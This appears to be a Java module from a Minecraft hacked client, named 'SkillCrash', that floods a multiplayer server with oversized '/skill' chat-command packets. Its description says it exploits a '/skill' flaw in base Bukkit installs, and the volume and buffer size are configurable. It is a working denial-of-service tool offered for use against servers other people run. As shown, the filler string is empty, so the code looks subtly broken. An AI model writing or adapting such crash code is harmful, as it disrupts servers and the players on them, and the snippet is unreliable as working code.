package com.tricrotism.modules.crash;

import com.tricrotism.api.eventbus.EventHandler;
import com.tricrotism.api.modules.Category;
import com.tricrotism.api.modules.Module;
import com.tricrotism.api.settings.Settings;
import com.tricrotism.events.game.GameQuitEvent;
import com.tricrotism.events.world.TickEvent;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ClientPacketListener;
import net.minecraft.network.protocol.game.ServerboundChatCommandPacket;

public class SkillCrash extends Module {

    public static final SkillCrash instance = new SkillCrash();

    private final Settings.Int packets =
        integer("Packets/tick", "packets", "Chat-command packets sent per tick", 15, 1, 100);
    private final Settings.Int buffer =
        integer("Buffer", "buffer", "Filler characters per packet", 32760, 1, 32760);

    public SkillCrash() {
        super("skillcrash", "Skill Crash", "Using the '/skill' exploit in base Bukkit installs.", Category.COMBAT);
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!isActive()) return;

        Minecraft mc = Minecraft.getInstance();
        if (mc.player == null || mc.getConnection() == null) return;

        ClientPacketListener handler = mc.getConnection();
        String spam = "skill " + "".repeat(buffer.get());
        for (int i = 0; i < packets.get(); i++) {
            handler.send(new ServerboundChatCommandPacket(spam));
        }
    }

    @EventHandler
    private void onGameLeft(GameQuitEvent event) {
        if (isActive()) toggle();
    }
}
